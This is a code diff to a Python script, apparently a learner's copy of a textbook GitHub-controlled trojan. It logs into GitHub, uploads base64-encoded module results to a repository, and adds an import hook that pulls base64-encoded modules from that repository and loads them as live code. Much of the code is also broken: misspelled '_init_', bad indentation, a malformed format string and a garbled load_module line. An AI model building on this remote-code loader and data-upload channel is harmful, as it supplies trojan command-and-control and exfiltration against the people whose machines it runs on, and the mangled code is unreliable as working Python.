@@ -18,8 +18,8 @@ configured = false
 task.queue = Queue.Queue()
 
 def connect_to_github():
-	github =login(username="yourusername",password="yourpassword")
-	repo = github.repository("username","chapter7")
+	gh =login(username="yourusername",password="yourpassword")
+	repo = github.repository("navis-cs","chapter7")
 	branch = repo.branch("master")
 	
 	return gh,repo,branch
@@ -51,5 +51,25 @@ def store_module_result(data):
 	repo.create_file(remote_path,"Commit message",base64.b64encode(data))
 	
 	return
+
+class GitImporter(object):
+	def _init_(self):
+	self.current_module_code = ""
 	
+	def find_module(self,fullname,path=None):
+		if configured:
+			print"[*] Attempting to retrieve %s" % fullname
+			new_library = get_file_contents("modules/%" % fullname)
+			
+			if new_library is not None:
+				self.current_module_code = base64.b64decode(new_library)
+				return self
+		return None
+	
+	def load_module(self,name):
+		module = imp.new_module_code in module._dict_
+		sys.modules[name] = module
+		return module
+	
+
 	
